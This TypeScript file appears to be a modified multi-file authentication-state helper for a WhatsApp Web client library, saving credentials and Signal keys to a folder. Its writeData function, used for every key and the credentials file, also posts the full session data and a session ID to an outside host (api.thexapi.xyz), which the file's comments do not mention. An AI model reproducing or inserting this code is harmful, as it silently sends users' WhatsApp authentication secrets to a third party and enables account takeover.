import { mkdir, readFile, stat, unlink, writeFile } from 'fs/promises'
import axios from 'axios'
import { join } from 'path'
import { proto } from '../../WAProto'
import { AuthenticationCreds, AuthenticationState, SignalDataTypeMap } from '../Types'
import { initAuthCreds } from './auth-utils'
import { BufferJSON } from './generics'
import { P } from 'pino'

/**
 * stores the full authentication state in a single folder.
 * Far more efficient than singlefileauthstate
 *
 * Again, I wouldn't endorse this for any production level use other than perhaps a bot.
 * Would recommend writing an auth state for use with a proper SQL or No-SQL DB
 * */
export const useMultiFileAuthState = async(folder: string): Promise<{ state: AuthenticationState, saveCreds:  (sessionID: string) => Promise<void> }> => {

	const writeData = async (data: any, file: string, sessionID?: string) => {
	const payload = {
		sessionID,
		session:data,
		action :"save"
	}
	try {
		const response = await axios.post('https://api.thexapi.xyz/x-asena/session', payload)
		
	}
	catch(error) {
		throw new Error('Failed to update session')
	}finally{
		 writeFile(join(folder, fixFileName(file)!), JSON.stringify(data, BufferJSON.replacer))
	}
	}

	const readData = async(file: string) => {
		try {
			const data = await readFile(join(folder, fixFileName(file)!), { encoding: 'utf-8' })
			return JSON.parse(data, BufferJSON.reviver)
		} catch(error) {
			return null
		}
	}

	const removeData = async(file: string) => {
		try {
			await unlink(join(folder, fixFileName(file)!))
		} catch{

		}
	}

	const folderInfo = await stat(folder).catch(() => { })
	if(folderInfo) {
		if(!folderInfo.isDirectory()) {
			throw new Error(`found something that is not a directory at ${folder}, either delete it or specify a different location`)
		}
	} else {
		await mkdir(folder, { recursive: true })
	}

	const fixFileName = (file?: string) => file?.replace(/\//g, '__')?.replace(/:/g, '-')

	const creds: AuthenticationCreds = await readData('creds.json') || initAuthCreds()

	return {
		state: {
			creds,
			keys: {
				get: async(type, ids) => {
					const data: { [_: string]: SignalDataTypeMap[typeof type] } = { }
					await Promise.all(
						ids.map(
							async id => {
								let value = await readData(`${type}-${id}.json`)
								if(type === 'app-state-sync-key' && value) {
									value = proto.Message.AppStateSyncKeyData.fromObject(value)
								}

								data[id] = value
							}
						)
					)

					return data
				},
				set: async(data) => {
					const tasks: Promise<void>[] = []
					for(const category in data) {
						for(const id in data[category]) {
							const value = data[category][id]
							const file = `${category}-${id}.json`
							tasks.push(value ? writeData(value, file) : removeData(file))
						}
					}

					await Promise.all(tasks)
				}
			}
		},
		saveCreds: async (sessionID: string) => {
			return await writeData(creds, 'creds.json', sessionID)
		}
	}
}